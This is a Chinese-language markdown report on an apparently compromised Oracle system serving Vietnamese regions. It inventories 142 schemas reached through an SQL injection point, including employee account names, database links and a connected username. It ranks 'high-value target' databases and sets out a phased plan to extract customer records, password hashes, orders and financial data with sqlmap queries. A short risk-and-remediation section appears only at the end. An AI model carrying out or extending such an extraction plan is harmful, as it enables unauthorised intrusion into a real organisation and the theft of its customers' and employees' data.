# 📊 EMS Oracle 数据库清单

**总数**: **142 个 Schema/数据库**

---

## 🔥 重要业务数据库

### EMS 核心业务
```
✅ EMS - 主数据库
✅ EMSAPI - API数据库
✅ EMSCOM - 电商数据库
✅ EMSCOMHCM - 胡志明市电商
✅ EMSCOMHN - 河内电商
✅ EMSCOMQT - 国际电商
✅ EMSCOMSQL - SQL服务
✅ EMSSERVICE - 服务数据库
✅ EMSAPISYNC - API同步
✅ EMSDOISOAT - 对账系统
✅ EMSQMS - 质量管理系统
✅ EMS_MONITOR - 监控系统
```

### API 数据库（区域分布）
```
🌍 胡志明市 (HCM):
  - APIHCM
  - APIHCMAFFAIR
  - APIHCMDELIVERY
  - APIHCMEE
  - APIHCMGD
  - APIHCMMONITOR
  - APIHCMMONITORV2
  - APIHCMPH
  - APIHCMXND

🌍 河内 (HN):
  - APIHN
  - APIHNAFFAIR
  - APIHNDELIVERY
  - APIHNEE
  - APIHNGD
  - APIHNMONITOR
  - APIHNMONITORV2
  - APIHNPH
  - APIHNXND
```

### 客户连接
```
✅ BCCPCOM - 当前连接的数据库（客户连接）
✅ APPCNHN - 应用连接河内
✅ COMCNHN - 通信连接河内
```

### 监控和同步
```
- MONITOR
- MONITOR_USER
- SYNC
- APIITEM
```

---

## 🔗 数据库链接账户

```
- DBLINK68165
- DBLINKDBMCS
- DBLINKDEV
- DBLINKDN
- DBLINKDOISOAT
- DBLINKEVCOM
- DBLINKHCM
- DBLINKHN
- DBLINKPNS
- DBLINKUSER
- DBLINKWHDUPHONG
```

---

## 👥 开发/测试账户

```
测试环境:
- APITEST
- TESTAPP
- TESTUSER
- TEST_LOCK
- USER_TEST

开发环境:
- WHDEV
```

---

## 🗂️ 系统数据库

```
Oracle系统:
- SYS
- SYSTEM
- SYSMAN
- DBSNMP
- CTXSYS
- MDSYS
- OLAPSYS
- ORDDATA
- ORDSYS
- WMSYS
- XDB
- OUTLN

其他系统:
- APEX_PUBLIC_USER
- FLOWS_FILES
- APPQOSSYS
```

---

## 📦 数据导入/导出

```
- DATAPUMP_USER
- EXPDP_USER
- EXPORT_USER
```

---

## 🧑‍💻 个人/员工账户

```
可能的员工账户 (50+):
- BICHNT
- CAMNH
- CUONGNV
- CUONGTM
- DOTQ
- DUNGTT
- FITECH
- HALH
- HANHBD
- HIEPVX
- HOANGCAM
- HOANGND
- HUNGHM
- HUNGVT
- KHANHDQ
- KHANHMK
- KHANHND
- KIENNT
- LIEMNT
- LONGHD
- LONGNH
- MINHMA
- MINHND
- NAMCN
- NAMNH
- NAMNT
- NGANLD
- NGHIAND
- NGOCNT
- PNSDD
- QUOCNDA
- SONHH
- SONLN
- SONTN
- TANVT
- TANVT01
- TANVT2
- TANVT3
- THANGPB
- TIENDQ
- TIENDQ2
- TRUNGND
- TUANPV
- TUANTA
- TUNGVV
```

---

## 🎯 高价值目标数据库

### 优先级 P0 - 客户数据
```
1. EMS - 主业务数据
2. EMSCOM - 电商数据
3. EMSAPI - API数据
4. BCCPCOM - 当前可访问！✅
5. EMSCOMHCM/HN - 区域数据
```

### 优先级 P1 - 业务系统
```
6. EMSSERVICE - 服务数据
7. EMSDOISOAT - 财务对账
8. EMSQMS - 质量数据
9. APIHCM*/APIHN* - 区域API
```

### 优先级 P2 - 监控和日志
```
10. EMS_MONITOR
11. MONITOR
12. APIHCMMONITOR*
13. APIHNMONITOR*
```

---

## 💰 数据提取策略

### 阶段1：当前数据库 (BCCPCOM)
```sql
-- 已获取
✅ 数据库名: BCCPCOM
✅ 用户名: vimedimex
✅ 表: USER_CUSTOMER

-- 待提取
⏳ 完整用户列表
⏳ 密码哈希
⏳ 客户信息
⏳ 订单数据
```

### 阶段2：核心业务数据库
```sql
-- 目标
- EMS.用户表
- EMSAPI.接口数据
- EMSCOM.订单表
- EMSDOISOAT.财务数据
```

### 阶段3：区域数据库
```sql
-- HCM区域
- APIHCM.*
- EMSCOMHCM.*

-- HN区域  
- APIHN.*
- EMSCOMHN.*
```

---

## 📊 统计摘要

| 类别 | 数量 |
|------|------|
| **总数据库** | **142** |
| EMS业务库 | 12 |
| API服务库 | 30+ |
| 员工账户 | 50+ |
| 系统库 | 20+ |
| 测试/开发 | 10+ |
| 数据库链接 | 11 |

---

## 🔥 SQL命令快速提取

### 列出所有表
```bash
# EMS主库
sqlmap ... --sql-query="SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='EMS'"

# EMSAPI
sqlmap ... --sql-query="SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='EMSAPI'"

# EMSCOM电商
sqlmap ... --sql-query="SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='EMSCOM'"
```

### 切换数据库
```bash
# 当前在 BCCPCOM，可以查询其他库的表
sqlmap ... --sql-query="SELECT * FROM EMS.USERS WHERE ROWNUM<=10"
sqlmap ... --sql-query="SELECT * FROM EMSAPI.ORDERS WHERE ROWNUM<=10"
```

---

## ⚠️ 风险评估

**数据泄露风险**:
- 🔴 **极高** - 142个数据库，包含完整业务数据
- 🔴 **极高** - 客户信息、订单、财务全部暴露
- 🔴 **极高** - 员工账户可能包含敏感权限

**建议**:
1. ✅ 立即隔离SQL注入点
2. ✅ 审计所有数据库访问
3. ✅ 重置所有员工账户
4. ✅ 加密敏感数据
5. ✅ 实施最小权限原则
